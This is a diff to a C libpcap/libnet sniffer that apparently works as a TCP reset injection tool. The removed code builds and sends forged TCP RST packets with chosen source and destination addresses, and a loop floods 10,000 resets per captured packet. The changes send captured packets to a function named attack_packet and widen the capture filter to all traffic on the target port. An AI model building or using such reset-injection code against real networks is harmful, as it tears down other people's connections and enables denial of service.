@@ -41,84 +41,6 @@ void leavesniffer(int sig) {
 }
 
 
-void sendTCPPacket(struct in_addr srcip, struct in_addr dstip, u_short sport, u_short dport, unsigned int seq, struct ethernet_hdr* ethheader) {
-
-	libnet_t* l = netcons;		
-	// Replaced all libnet_get_prand(LIBNET_PRu16) for performance..
-	libnet_ptag_t t;
-	libnet_seed_prand(l);
-	uint32_t someValue = 1000000;
-	/* TCP Header and IP Header describes the message sent to us, 
-	 * so we should reverse the order of source and destination... */
-	t = libnet_build_tcp(
-		sport,      /* src port */
-		dport,      /* dst port */
-		seq,         /* seq num */
-		0,    /* ack num */
-		TCP_RST,       /* tcp flag */
-		10000,         /* window size */
-		0,             /* checksum (0 for autofill) */
-		0,             /* urgent pointer */
-		LIBNET_TCP_H,           /* packet size */
-		NULL,           /* payload */
-		0,           /* payload_size*/
-		l,           /* libnet handle */
-		0            /* ptag protocol tag to modify an existing header, 0 to build a new one
-		 */
-	);
-
-	if (t == -1) {
-		printf("Failed to build TCP header: %s\n",
-			libnet_geterror(l)
-		);
-		leavesniffer(1);
-	}
-
-	t = libnet_build_ipv4(
-		LIBNET_IPV4_H + LIBNET_TCP_H,    /* length */
-		IPTOS_LOWDELAY,    /* type of service */
-		0,  /* ip id */
-		0,    /* ip frag */
-		255,    /* TTL */
-		IP_TCP,  /* IP protocol */
-		0,       /*checksum*/
-		*((u_long*) &(srcip)),   /* source ip */
-		*((u_long*) &(dstip)),   /* destination ip */
-		NULL,     /* payload */
-		0,        /* payloadsize */
-		l,        /* libnet handle */
-		0         /* libnet id */
-	);
-	 
-	if (t == -1) {
-		printf("Failed to build IP header: %s\n",
-			libnet_geterror(l)
-		);
-		leavesniffer(1);
-	}
-
-	t = libnet_autobuild_ethernet(
-		ethheader->ether_src_addr,  /* const uint8_t *dst */
-		0,  /* uint16_t type: libnet protocol tag*/
-		l			 /* libnet handler */
-	);
-
-	if (t == -1) {
-		printf("Failed to autobuild Ethernet header: %s\n",
-			libnet_geterror(l)
-		);
-	}
-
-	if (libnet_write(l) == -1) {
-		printf("Falied to write packet: %s\n",
-			libnet_geterror(l)
-		);
-	}
-	libnet_clear_packet(l);
-	return;
-}
-
-
 
 
 void construct_reset_pkt(libnet_t* l, struct tcp_hdr* tcpheader, struct ip_hdr* ipheader, struct ethernet_hdr* ethheader, int payload_size) {
@@ -200,58 +122,9 @@ void construct_reset_pkt(libnet_t* l, struct tcp_hdr* tcpheader, struct ip_hdr* 
 
 
 void parse_pkt(struct pcap_pkthdr* header, const u_char* data) {
-	struct ip_hdr* ipheader;
-	struct tcp_hdr* tcpheader;
-	struct icmp_hdr* icmpheader;
-	struct ethernet_hdr* ethheader;
-	u_char* payload;
 
-	bool has_ip_header = true;
-	bool has_tcp_header = false;
-	bool has_payload = true;
-	bool has_icmp = false;
+	attack_packet(netcons, header, data);
 
-	int ip_size;
-	int tcp_size;
-	int payload_size;
-
-	ethheader = (struct ethernet_hdr*) data;
-	ipheader = (struct ip_hdr*) (data + ETHER_HDR_LEN);
-	ip_size = ipheader->ip_hlen * INFO_WORD_SIZE;
-	if (ip_size < 20) {
-		has_ip_header = false;
-	}
-	if (ipheader->ip_protocol == IP_ICMP) {
-		icmpheader = (struct icmp_hdr*) (data + ip_size + ETHER_HDR_LEN);
-		has_icmp = true;
-	} else if (ipheader->ip_protocol == IP_TCP) {
-		has_tcp_header = true;	
-	}
-
-	tcpheader = (struct tcp_hdr*) (data + ETHER_HDR_LEN + ip_size);
-	tcp_size = (tcpheader->tcp_off) * INFO_WORD_SIZE;
-	if (tcp_size < 20) {
-		has_tcp_header = false;
-	}
-
-	//payload = (u_char*) (data + ETHER_HDR_LEN + ip_size + tcp_size);
-	//payload_size = ntohs(ipheader->ip_len) - (ip_size + tcp_size);
-	//if (payload_size <= 0) {
-	//	has_payload = false;
-	//}
-
-	// log_ethernet(ethheader);
-	// if (has_ip_header) log_ip(ipheader);
-	// if (has_tcp_header) log_tcp(tcpheader, payload_size);
-	// if (has_payload && has_tcp_header) log_payload(payload, payload_size);
-	// if (has_icmp) log_icmp(icmpheader);
-	// printf("\n");
-	
-	counter = 0;
-	for (int i = 0; i < 10000; i++) {
-	construct_reset_pkt(netcons, tcpheader, ipheader, ethheader, payload_size);
-	}
-	return;
 }
 
 
@@ -292,7 +165,8 @@ int main (int argc, char** argv) {
 	}
 
 	char filterbuf[DEVICE_BUF_SIZE];
-	sprintf(filterbuf, "tcp port %d and src port %d and inbound", port, port);
+	//sprintf(filterbuf, "tcp port %d and src port %d and inbound", port, port);
+	sprintf(filterbuf, "tcp port %d", port);
 	if ((handler = open_pcap_socket_filtered(device, filterbuf))) {
 		if ((netcons = open_libnet_handler(device))) {
 			signal(SIGTERM, leavesniffer); 
